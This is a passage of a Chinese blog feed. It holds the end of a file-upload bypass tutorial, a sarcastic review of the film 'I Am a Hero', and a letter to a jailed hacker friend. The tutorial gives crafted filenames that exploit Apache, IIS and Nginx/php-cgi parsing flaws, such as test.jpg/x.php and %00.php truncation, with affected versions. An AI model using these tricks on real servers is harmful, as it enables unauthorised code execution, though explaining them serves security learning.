<span class="hljs-string">&#x27;jpeg&#x27;</span>, $extension);$open_func = <span class="hljs-string">&#x27;imageCreateFrom&#x27;</span>. $extension; //函数名变成 imageCreateFrompng 之类<span class="hljs-keyword">if</span> (!function_exists($open_func))&#123;<span class="hljs-keyword">return</span> FALSE;&#125;<span class="hljs-keyword">return</span> $open_func($file); //变成 imagecreatefrompng(<span class="hljs-string">&#x27;/tmp/php0lbTOn&#x27;</span>)&#125;</code></pre><p>将你上传的文件中属于图片部分的数据抓取出来，再使用自己的API或者函数重新将这张图片生成出来保存在服务端</p><h1 id="0x05-解析攻击"><a href="#0x05-解析攻击" class="headerlink" title="0x05 解析攻击"></a>0x05 解析攻击</h1><h2 id="直接攻击"><a href="#直接攻击" class="headerlink" title="直接攻击"></a>直接攻击</h2><p>直接能上传一个php文件绕过客户端<code>js检测</code>或者<code>服务端MIME检测</code></p><h2 id="配合解析"><a href="#配合解析" class="headerlink" title="配合解析"></a>配合解析</h2><p>先将代码以任意文件形式上传到服务器，通过<code>php文件包含</code><br><code>web服务器解析漏洞.htaccess解析</code>等<br>相互配合达成解析为目标文件类型的攻击</p><h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><ul><li><p>解析：<code>test.php.jkl</code> 并没<code>.jkl</code>后缀的文件，而<code>Apache</code>的某些版本中会直接当成<code>php</code>来解析</p></li><li><p>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</p></li><li><p>对应版本：</p><pre><code class="hljs apache"><span class="hljs-attribute">WampServer2</span>.<span class="hljs-number">0</span> <span class="hljs-literal">All</span> Version (WampServer<span class="hljs-number">2</span>.<span class="hljs-number">0</span>i / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">11</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">WampServer2</span>.<span class="hljs-number">1</span> <span class="hljs-literal">All</span> Version (WampServer<span class="hljs-number">2</span>.<span class="hljs-number">1</span>e-x<span class="hljs-number">32</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">17</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">Wamp5</span> <span class="hljs-literal">All</span> Version (Wamp<span class="hljs-number">5</span>_<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">4</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">6</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">AppServ</span> <span class="hljs-number">2</span>.<span class="hljs-number">4</span> <span class="hljs-literal">All</span> Version (AppServ - <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">9</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">59</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">AppServ</span> <span class="hljs-number">2</span>.<span class="hljs-number">5</span> <span class="hljs-literal">All</span> Version (AppServ - <span class="hljs-number">2</span>.<span class="hljs-number">5</span>.<span class="hljs-number">10</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">AppServ</span> <span class="hljs-number">2</span>.<span class="hljs-number">6</span> <span class="hljs-literal">All</span> Version (AppServ - <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">0</span> / Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>)<span class="hljs-meta"> [Success]</span></code></pre></li></ul><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/15.png" alt="文件上传绕过姿势总结"></p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/16.png" alt="文件上传绕过姿势总结"></p><h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><ul><li><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p></li><li><p>描述：<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析<br><code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p></li><li><p>对应版本：</p><pre><code class="hljs apache"><span class="hljs-attribute">IIS6</span>.<span class="hljs-number">0</span> (Win<span class="hljs-number">2003</span> SP<span class="hljs-number">2</span> + IIS<span class="hljs-number">6</span>.<span class="hljs-number">0</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">IIS7</span>.<span class="hljs-number">0</span> (Win<span class="hljs-number">2008</span> R<span class="hljs-number">1</span> + IIS<span class="hljs-number">7</span>.<span class="hljs-number">0</span>)<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">IIS7</span>.<span class="hljs-number">5</span> (Win<span class="hljs-number">2008</span> R<span class="hljs-number">2</span> + IIS<span class="hljs-number">7</span>.<span class="hljs-number">5</span>)<span class="hljs-meta"> [Success]</span></code></pre></li></ul><ul><li>注意<br><code>任意文件名/任意文件名.php</code>这个漏洞是因为<code>php-cgi</code></li></ul><p><code>IIS6.0</code></p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/17.png" alt="文件上传绕过姿势总结"></p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/18.png" alt="文件上传绕过姿势总结"></p><p><code>IIS7</code></p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/19.png" alt="文件上传绕过姿势总结"></p><h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><ul><li><p>解析：<code>任意文件名/任意文件名.php</code>;<code>任意文件名%00.php</code>都当作php来解析</p></li><li><p>描述：例如原文件名<code>test.jpg</code>但内容包含php一句话添加为<code>test.jpg/x.php</code>来进行解析攻击<br>低版本可以子任意文件名后添加<code>%00.php</code>进行截断攻击</p></li><li><p>对应版本：</p><pre><code class="hljs apache"><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">5</span>.*<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">6</span>.*<span class="hljs-meta"> [Success]</span><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">7</span> &amp;lt;= <span class="hljs-number">0</span>.<span class="hljs-number">7</span>.<span class="hljs-number">65</span><span class="hljs-meta"> [Success]</span><span class="hljs-attribute">nginx</span> <span class="hljs-number">0</span>.<span class="hljs-number">8</span> &amp;lt;= <span class="hljs-number">0</span>.<span class="hljs-number">8</span>.<span class="hljs-number">37</span><span class="hljs-meta"> [Success]</span></code></pre></li></ul><ul><li>注意<br><code>任意文件名/任意文件名.php</code>这个漏洞是因为<code>php-cgi</code></li></ul><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/20.png" alt="文件上传绕过姿势总结"></p><h3 id="php-cgi"><a href="#php-cgi" class="headerlink" title="php-cgi"></a>php-cgi</h3><p>这类漏洞主要出现在<code>IIS</code>和<code>Nginx</code>这类以<code>CGI</code>形式调用<code>php</code>的<code>web</code>应用程序<br>而<code>Apache</code>通常是以<code>module</code>的形式去调用<code>php</code>，所以很少出现这个漏洞</p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/21.png" alt="文件上传绕过姿势总结"><br>可以看到这里实际运行效果是以 <code>cgi.fix_pathinfo = 1</code> 在运行<br>而通常安全意识不高的管理员在安装 <code>IIS+php</code> 或 <code>Nginx+php</code> 的时候都是以默认配置在安装<br>自然这种情况下，这类服务器全都会产生漏洞</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/22.png" alt="文件上传绕过姿势总结"></p><p><img src="/images/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/23.png" alt="文件上传绕过姿势总结"></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>看完《请叫我英雄》这部日产的丧尸片以后，心情久久无法平复。</title>
    <link href="/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E7%9C%8B%E5%AE%8C%E3%80%8A%E8%AF%B7%E5%8F%AB%E6%88%91%E8%8B%B1%E9%9B%84%E3%80%8B%E8%BF%99%E9%83%A8%E6%97%A5%E4%BA%A7%E7%9A%84%E4%B8%A7%E5%B0%B8%E7%89%87%E4%BB%A5%E5%90%8E%EF%BC%8C%E5%BF%83%E6%83%85%E4%B9%85%E4%B9%85%E6%97%A0%E6%B3%95%E5%B9%B3%E5%A4%8D%E3%80%82.html"/>
    <url>/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E7%9C%8B%E5%AE%8C%E3%80%8A%E8%AF%B7%E5%8F%AB%E6%88%91%E8%8B%B1%E9%9B%84%E3%80%8B%E8%BF%99%E9%83%A8%E6%97%A5%E4%BA%A7%E7%9A%84%E4%B8%A7%E5%B0%B8%E7%89%87%E4%BB%A5%E5%90%8E%EF%BC%8C%E5%BF%83%E6%83%85%E4%B9%85%E4%B9%85%E6%97%A0%E6%B3%95%E5%B9%B3%E5%A4%8D%E3%80%82.html</url>
    
    <content type="html"><![CDATA[<p>对不起爸妈，我辜负了你们的养育之恩。竟然一个人在电脑前吃了两个多小时的屎，我很难受，非常难受。我真的不该听信一些白痴的话，说这是一部超越釜山行的电影。当我点开这部剧，我就一直没有搞明白到底剧情想说什么。刚刚开始以为这大概是一个身为喜欢幻想的，漫画家助手的，屌丝男主化身成为打丧尸的英雄的逆袭之路（毕竟他名字叫铃木英雄）。或许是我的领悟能力太差，又或许是我的品味低下。但是，我真的很像搞明白这部丧尸电影到底想表达什么。后来我知道了，就是跑，逃，偶救高中美眉，一路保护她，前往富士山，据说海拔高就不会被感染。（你丫的，这个剧情设定也太狗血了点了吧，然而你们始终还是没到富士山。当然，我不知道还有没下一部前往富士山）</p><a id="more"></a><p>然后呢，我一直在纠结，男主身上背着一把枪，你为什么不开枪？为什么不开枪？求你开一枪好不好！然后，终于男主在我煎熬了1小时42分39秒以后开出了第一发子弹。然后就是男主的屠杀时间了。枪枪爆头，你为什么早点不开枪！除了丧尸电影必备的吐槽点不关门以外。以下是我对本剧的吐槽：（ps：看到此条微博的小伙伴，如果不赞成我的观点，可以自己去看一下，然后呢，觉得好看也不要喷我，就当我吃了两小时的屎，发一点牢骚）<br>第一，不多提了，男主始终为了所谓的枪械管制法始终不开枪，到了接近尾声才开始展现男儿本色。</p><p>第二，男主偶然遇到，并且算是他救下的美女高中生（颜值还是可以的），被邻家的婴儿咬到了脖颈，一直没有发作，可能是婴儿的毒性不强吧。然后呢，在男主和她在寺庙门前过夜，男主先醒来偷窥美少女的时候，心中想着“淫乱是罪”，但是他还是继续偷窥了。然后看见美少女脖颈后面有一个被咬过的伤口，瞬间爆炸，拿起枪（不要急，这怂货绝逼不会开枪的）。然后听完美少女的解释以后，突发慈悲，安慰美少女“没事的，毕竟我叫英雄，我相信奇迹，你可能不会变异呀！”然后继续拿着那把枪，和美少女前往富士山。可是万万没有想到，女主变异了。他收下女主自认为是护身符的mp3以后，挥泪告别。然后跑跑跑，然后就在丛林撞见了丧尸，千钧一发之际，美少女一记霸王拳，把丧尸打出十几米远，救下了男主。男主懵比了，我也跟着懵比了。美少女的变异我也搞不懂是什么，可能就是半丧尸化，还有人性，但是力大无穷，唯一不同的是她不会于人交流了，然后一边眼睛丧尸化，还有爱吃猫粮了。然后，我以为现在开始剧情要转变了，结果我错了。我发现，就那一次大爆发以后，美少女陷入了沉睡，偶尔醒来指望她发个超必杀什么的，然而都没有。对美少女的吐槽就是，如果没有下一部，我不知道她到底有什么用…到底她的存在是为了激发男主的英雄之心呢，还是就是为了给逃生的队伍增加难度。</p><p>第三，这是最可怕的。为什么人在变丧尸以后，还能记着生前的技能和正在干的事情呀。大概就是剧情设定吧，然而我又错了，这个原来是个伏笔呀。一个曾经是一个运动员，大概是跳高运动员吧。他以一人之力团灭了整个楼顶的人，我整部戏就服他，在无数次的尝试原地跳起，跳上几层楼高的生存基地后，终于，在一段歌曲的激发下成功上平台了（我特地找了这首歌，歌名叫Voices of Spring, Op.410 (From “Drop Dead Gorgeous”)大家可以去感受一下，我感觉以后中国队跳高队训练就可以用这个bgm）这个穿着运动裤衩的丧尸给我留下了一个很深的印象，也告诉我们一个道理，只要你坚持不放弃，终有一天在属于你的bgm下，你会团灭整个部队。</p><p>第三，当然了，一个电影怎么会没有反派。在楼顶的生存基地上，就有一个叫“伊浦”的反派。我也搞不清出这个反派到底在想些什么，但是冲他的那句“我就是法律”我可以看出来，这个人的野心和统治力。但是，你在这生存基地上你想搞什么统治？后来我知道了，他一心想拿到男主的那把枪，然后统治一切，让谁去楼下食品厂库冒死拿吃的谁就得去。然而，拿枪失败，反被另一个算不上反派，但是活到了比较后面的黑衣男子拿到了枪，可是，黑衣男子只是想打倒伊浦的统治。为什么这样说呢？因为他自己并没有呆在楼顶让别人去穿过丧尸的战线，到达仓库拿吃的。他自己也去了加入了“拿吃的小队”。但是万万没有想到，这个反派伊浦终于开始了他的报复。他熟悉整个生存基地旁仓库，甚至很多地方的地形。伊浦直接趁着黑，摸到了可以看到大仓库的监控室，然后看着他们走向自己的圈套。他首先打开了所有的灯，然后，接着用扩音器打开了第二点中我说到的音乐。结果可想而知，听到音乐的丧尸，像吃了兴奋剂一样，扑向在仓库中觅食的众人（再次吐槽这个神一般的bgm）。男主也在其中，不过手中的枪被黑衣男子没收了，手中拿着棒棒锤，我也不知道干嘛用的。在伊浦的计划下，觅食小队几乎全军覆没，男主逃到小储物柜才保住性命。与此同时，跳高运动员丧尸已经团灭了整个生存基地，仅剩下我都没提到的身怀绝技的护士小姐和陷入昏睡的美少女比吕美。剧情不想提了，对于这个反派“伊浦”吐槽就是，他在自以为完成灭杀众人的计划后，拿着车钥匙准备离开，结果遇到了背着美少女的护士小姐，出乎意料的是他在这丧尸围城，紧急万分的情况下，居然让护士小姐和他做爱。我的天老爷，日本人，我真的佩服你们，虽然说他是个反派，但是你也不看看是什么时机，就想着做爱。看来你们也确实拍着丧尸片还心系爱情动作，我服了。<br>第四，最后一点当然是在男主开了第一枪打爆了，做爱不成正准备变身丧尸的“伊浦”脑袋以后发生的事情。所有的人都死绝了，就剩下莫名其妙还活着的黑衣男子，一个大叔（注意，这个大叔才是这部剧唯一感动我的地方），护士小姐和沉睡的美少女，还有男主，这5人。男主在开响了第一枪以后觉醒了男人的英雄之心，虽然说，已经是临近电影结束15分钟了。虽然只有96发子弹，但是我还是看到了男主真正的实力，枪枪爆头。靠着这96发子弹解决了所有包围上来的丧尸，但是万万没有想到的是，那个令我印象深刻的，穿着裤衩的跳高运动员丧尸出现了，他不仅完成了在生存基地的团灭，还想给予众人最后的一击。在仅剩下的几颗子弹都打不死他的情况下（毕竟运动员，贼灵活，我躲，我躲），最后一颗子弹，男主终于爆头跳高运动员丧尸。但是这位运动员老哥，爆头都死不了，我再一次的服了。还好男主再一次大展男儿雄风，用没有子弹的“烧火棍”给了我们的老大哥致命一击，完成全歼丧尸任务。最后5人，只剩下护士小姐、沉睡美少女和男主三人。不得不提的是，黑衣男子勇敢的去和丧尸肉搏被一群围住，大喊刺激，然后让男主开枪击杀，一个大的aoe伤害。还有那个悲情的大叔，咬住自己的原来是自己的妻子，他在杀掉妻子以后也自杀了，真是个令人敬佩的老大叔。</p><p>3人坐上了“伊浦”事先准备的汽车离去了，据说还有下一部，大概是前往富士山了吧。整整两个多小时，我也不知道自己是怎么熬过来的，大概是心中那个声音“快开枪，快开枪，你到底什么时候开枪？”这句话支撑了我看完了全部。</p><p>如果完全说这是一部烂片的话，那倒还不至于，因为剧中一些小桥段还是值得人深思的。或许我应该站在日本人的角度去想想，该剧的确用巧妙的手法控诉了日本残酷的就业环境和生存压力。从男主漫画一路被人嫌弃，到逃亡路上出租车司机死前的那一番将自己过往工作经历的吐露，都是发人深省的。但是，我还是想对导演说，我不知道你是谁，也不想知道，不过，你真的应该去学学人家韩国的电影制作。你的逻辑太差了，或则是你想表达的东西很多，但是没办法在短短的两个小时内解释清楚，不过，我建议您可以将这部剧拍成电视剧，七七四十九集连载，可能会有出其不意的效果（这里你又要去学一下人家欧美的“行尸走肉”）。据说还有下一部，我还是由衷期待的下一部。希望导演您能给我们带来不一样的感受，至少能让我这个悟性不高但是很喜欢电影的小观众一个不一样的观影体验。最后说一点，美少女给男主的mp3和她自己喜欢的那首歌还是很好听的，也是该剧的片尾曲，叫“Home On The Range”。也算的上是渣片良曲吧！（网易云电影原曲没有上传，只能听听别人版本的了，你们可以为了这首原曲去看看电影，直接跳到片尾部分听歌就行）</p><p>以上是我个人对“请叫我英雄”这部剧的小小吐槽。只是我个人的看法，你不同意，我也不勉强你接受，当作没看到就行，谢谢。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大风车全体成员写给Bge，只为你有一天可以看到。等你归来</title>
    <link href="/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E5%A4%A7%E9%A3%8E%E8%BD%A6%E5%85%A8%E4%BD%93%E6%88%90%E5%91%98%E5%86%99%E7%BB%99Bge%EF%BC%8C%E5%8F%AA%E4%B8%BA%E4%BD%A0%E6%9C%89%E4%B8%80%E5%A4%A9%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E3%80%82%E7%AD%89%E4%BD%A0%E5%BD%92%E6%9D%A5.html"/>
    <url>/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E5%A4%A7%E9%A3%8E%E8%BD%A6%E5%85%A8%E4%BD%93%E6%88%90%E5%91%98%E5%86%99%E7%BB%99Bge%EF%BC%8C%E5%8F%AA%E4%B8%BA%E4%BD%A0%E6%9C%89%E4%B8%80%E5%A4%A9%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E3%80%82%E7%AD%89%E4%BD%A0%E5%BD%92%E6%9D%A5.html</url>
    
    <content type="html"><![CDATA[<p>这篇文章，我是怀着无比沉重的心情，在键盘上一个字一个字码出来了。和小Y说好了晚上6点就想写了，一直到晚上的9点，我打开word却迟迟下不了手，那种难受不是在写医学论文时候的思虑和斟酌。也不是因为不知道写些什么，而是，想说的话太多了。<br>网易云的音乐在随机播放着，直到播放到，现在很火的那部“法医秦明”的网剧的片尾曲“不灭”，我心中拥堵的言语，仿佛有了疏通的管道，一股脑的的涌了出来。这篇文章，我打算以第二人称来写，只为有一天Bge（化名），你可以看的到。</p><p>今天是你进去的第四个月，请原谅我现在才认真的来抒发我的感情。不知道，你到时候还会不会记得当初我们的“大风车”。我也不清楚你具体进去几年，三年或是五年。我知道可能你的前途就此断送了，我恨，我恨那个矮子狗蛋（化名）。我们将来见不到你的日子，都是他一手造成的。<a id="more"></a>你是真的傻，当初我们有说过他这个人不简单，早些离开他，不要给他“卖命”。你却一味的认为，跟着他能赚到钱。不知道，当你看到这篇文章，回头在想想他，心中会不会后悔没有听我们的话。但是，用几年的时间去明白一个道理，看透一个人，这样的代价真的太大了。</p><p>LC，你知道，我们有多想你吗。一个花季少年，在他最应该奋斗和打拼的年纪，却失去了自由。不知道你是不是还记得，当初的哪一份悸动。从我在渗透吧第一次看到NPLT（化名）这个ID开始，我就和老大说，这小子还不错呀，我对他挺好奇的，感觉是个会钻研技术的人。后来你担任了小吧，也进入了我们“大风车”。我们通过进一步的了解，渐渐的熟了，你和“大师智”也被我们称为两个死基佬。什么，“大师智”是谁？他就是那个“纠结的坏”呀。你还记得为什么“Bge”的这个称号是这么来的吗？当时我和老大在看一个叫小智的英雄联盟（LOL）解说视频时候，因为小智的视频是他和他的一个叫Bge的好朋友一起双排打的，然后我就在群里发了，“Bge”还有“大师智”这两个称号。“纠结的坏”就说其实他就是大师智，然后你就说“我是Bge呀”。从此，我们都开始改口叫你Bge，叫那个傻逼大师智。</p><p>Bge，自从你在网络上没了消息，我们就开始对你进行猜测，没想到当时开玩笑的一句“他不会被查水表，被请去喝茶了吧”，竟然成了真。你空间里的说说被定格在了2016.6.6，还是吃了bsrc送的粽子。我多么希望你能在今时今日发一条说说，呐喊一声“妈的，兄弟们。我回来了”。回忆起以前在一起的时光，我们的交集可能真的不多，交流也是在“大风车”里的扯淡和闲聊，毕竟我的职业和互联网交集太少，渗透或许只是我的兴趣罢了。只是有问题的时候，你都会跟我一通乱扯，我也是一脸懵比，到头来还是老大给我解惑。你说你有什么用，你这渗透吧的小吧当的，群里的秩序也不管管，吧里的垃圾广告帖子也不删一删。还好还有小可爱他们，要不我早就把你的小吧给下了。每每和大师智讨论渗透套路起来，一套一套的，现在大师智都毕业出来，找了一份辣鸡但是很稳定的工作了。我相信要是当时你要是不上了狗蛋这艘贼船，也不会有后来的事情。不过你不用担心，在繁衍下一代的速度上，大师智肯定还是比不上你的，毕竟一个长得和失败试验品似的人，哪有那么快呢，哈哈。</p><p>我不知道当你看到这篇文章的时候是什么样的心情，我早上看到一条消息比较生气。小可爱在我们的“大风车”里发“我这辈子是不可能不日战的，又不会写网站，只能靠日站维持生活，牢里比家里好多了，里面的黑阔们个个都是人才，思路好多了 ，技术也特别棒”我直接把他禁言了30分钟。我平时和他们闹着玩也就是玩玩权限禁言他们三四分钟，这次我真的比较生气，因为我想到了你。谁都知道，对于互联网来说时间意味这什么，不要说几年了，就算是两三个月都可能翻天。就说吧，以前谁能想到乌云这个漏洞提交的圣地会垮台，但是事情就是眼睁睁的发生在了网络中。更为重要的是，自由，对于一个正常人，一个20出头的少年意味着什么。我们不知道你在里面过的怎么样，有没有在深夜暗自悔恨当初。我们能为你做的只剩下闲时想起你的那一份心酸和难受。</p><p>你失去联系的那段时间，我也因为工作的原因自己撤去了渗透吧主的身份，我也就是个副吧主，吧里少了我无关痛痒，反正我也是这么想的。所以渗透吧就剩下了老大一个人在管理，至于后来老大找来了谁谁谁。我就不了解了，也没时间去了解。留给我们的只剩下你在2016.6.6之前的回忆，或许等你回来渗透吧真的就变成了修水管渗透的贴吧了，毕竟现在连我都不愿意踏足那里了。你还记得我那时候闲下来时候，每天深夜给你们更新的恐怖小说《恐录》吗？那时候我也是一时冲动，在下班或则在深夜值班时候没事情做，突发奇想，想蛮写蛮写一本小说。故事的大致纲要和路线都在我的脑子里了，每天闲下来时候都会写上几百字甚至上千，只为了晚上给你们在“大风车”里更新给你们看，你还跟我说“给我安排一个好一点的角色”，我那时候就给你分配了一个保安的身份，后来还死了，哈哈哈。然后在你的恳求之下，我让“你”借尸还魂了，让你当了一个体育频道的主持人。其他人的角色身份也都是我一个一个安插上去的，当时小Y还在高三，看不了。我到了周末都会把一周更新的在全部发一遍出来，为了大伙，特别是“队长”的需求，我再忙，也会有想挤出时间去写这本书的冲动。后来自从你跟了狗蛋，在群里基本上我都看不到你的发言了，渐渐的大家对我的这本书的热情也淡了，加上自己的工作开始进入很忙的一段时间，就断更了。《恐录》这本书也胎死腹中，可能写了还不到一半。你以后要是想看也不会有了，说实话之前的剧情，你敢说不期待？以后你要是想看，说不定我会继续为了你和大伙重新开始规划，来一个《恐录2.0》也不一定哦。</p><p>就在前两天我在知乎上看见了一个帖子“如何评价某某某安全团队的狗蛋”。这是一个匿名用户发出来的，大致的内容呢也就是拔了狗蛋的一些底子。“明面上的讲师，成功人士，年少有位，背地里面的疯狂黑产。出名事实上靠团队，很多文章漏洞，都是他团队里的人发现，他发出来而已。”大致上就是这些扒底的内容，在我看来，或许只有经历过事件的我们才知道到底狗蛋是个怎么样的人。在看到这个帖子的时候，怒的是我们整个“大风车”里的所有人。还在搞这一行的或许都不敢用真实的知乎ID发出自己的声音，都是匿名在该骂的骂该吹的吹。我和队长，两个毅然的站了出来，匿名个屁直接一顿狂喷狗蛋，我们最愤怒的话归纳起来，就呐喊一句“还我Bge！”当然，大肆称赞狗蛋的人一抓一大把，然而他们又知道什么呢。狗蛋自己也发文“所谓的一切喷词，都是那些匿名用户的欲加之罪，都是眼红。”难道，狗蛋自己在发出来的时候就不会有一丝的良心谴责吗。可笑，你今天所谓的成功，所谓的利益，难道不是牺牲了某些人的一切吗。匿名的人在喷狗蛋的人，我在这里替“大风车”和Bge谢谢你们。不管你们是不是知道真相，还是只是凑个热闹，人云亦云的扯上两句，我都要感谢你。而那些继续捧这狗蛋的人，我也不想说什么，如果有一天Bge的事情发生在你的周围，甚至是你的身上。我希望你在多年以后登录上自己的知乎帐号看看自己多年前可笑的言论。在这一刻我，真正的感觉到了鲁迅当时对中国的悲哀，他说“哪怕医学能拯救得了中国人孱弱的体质，也救不了国人麻木的精神。凡是愚弱的国民，即使体格如何健全，如何茁壮，也只能做毫无意义的示众的材料和看客，病死多少是不必以为不幸的。”。即使是在这虚拟的网络中，我也感同身受医学真的救不了国人，为了自己的利益，哪怕牺牲无数人的一切，那有如何。但是又能怎么样呢，我至少拥有良心和责任，我不会放弃继续治愈你们。</p><p>我相信每个人所有经历过的朋友，包括曾经的、未来的、甚至失去的朋友，这一切都是命中注定好了的。和你们一样，回想起Bge和自己的一点点交集，感觉友谊虽然浅薄，但是我们都对彼此的流露过自己最真实的感情。我们一起疯狂过，一起互黑过，才有现在我在写此篇文章时候内心的五味杂陈。“想起那天夕阳下的奔跑，那是我们逝去的青春”，这是大风车的头像里的文字。从你离开到现在，直至以后，我们都不会去更改，因为我们怕你不认得回家的路。在这里还有一群在等待着你回来的伙伴，我们的聊天频道也一直替你留着一个位置。</p><p>啊B，你知道你失联以后我们每次想你都干什么吗。我们会打开你的空间看看你的老照片，继续笑你这个猥琐b，可是这个笑却包含了我们满腔的辛酸。你空间里还保存着一张，也是唯一和队长的合影。那时候的队长相比于现在还开朗很多，不知道是随着时间的更迭，还是你的离开。仿佛一切都在变化，以前在我们看来无比珍重，无比渴望的事情，也在逐渐的消散，唯一不变的就是对你的哪一份念想。老朋友呀，我们无能为力呀，谁都没有想到当时在我们看起来是玩笑话的“查水表”有一天会发生在你的身上，条子也没有让你去喝个茶就回来了。真正应该被砍死的那个狗蛋，现在还在张狂的伪装着。自古说书唱戏劝人方，三条大道走中央。善恶到头终有报，人间正道是沧桑。他以为能这么无限的嚣张下去，踩着别人的未来和自由走向他的利益，开玩笑。</p><p>Bge你生活在我们当中，内心却自有你的一片天地，努力和钻研是你的标签，对未来十分好奇并且怀有憧憬，你从来没有放弃自己过自己的梦想，从你加入渗透吧开始，即使有点偏差，大目标依然都未曾改变过。或许你有很多的人生计划，有对未来生活的安排和渴望，也或许你准备了很多惊喜想提供给我们这些朋友，也想过给自己的家人一份温饱和幸福，可是这一切都还没来的及全部实现，你就在追梦的路上停下了脚步。我们永远都无法知道Bge你内心还有多少曾经设想甚至没来得及吐露的梦。我知道，比我们更加难受的是你的家人。一家人苦苦等待着你能够在完成学业后，假期归来，一家团聚吃顿饭。可是一切美满的进行中却被一个这辈子都被人唾骂的狗蛋所终结。其实，说到底还是你内心对完成梦想的过度渴望被狗蛋利用了。不过，Bge如果你现在看到的话，还是希望你能够重新开始自己新的生活，让你的爱，你的欣喜，淹没痛苦和委屈。在追梦的路上，你始终有我们“大风车”里的小伙伴们的陪同，梦想不会随风而去，他依然把握在你的手上。都说“哭过的眼看岁月更清楚”，我不清楚你在里面是否也曾为了自己暂时搁浅的梦眼角滑落泪水，但是心系你的亲人和朋友肯定为了流过泪。我们不希望，在数年后看到一个坠入深渊的LC，我们坚信来年的春天，花儿依然还会开放，那句迟到的“兄弟们，我Bge又回来了。”始终会来到，只不过来的有点慢，苦了我们这些等待已久的人。</p><p>我写了这么久，虽然还有很多很多的话没有吐露出来，但是以上是我此时最想让你看到的。我们“大风车”永远是一个有爱的团体，你的回归永远不会迟到。他们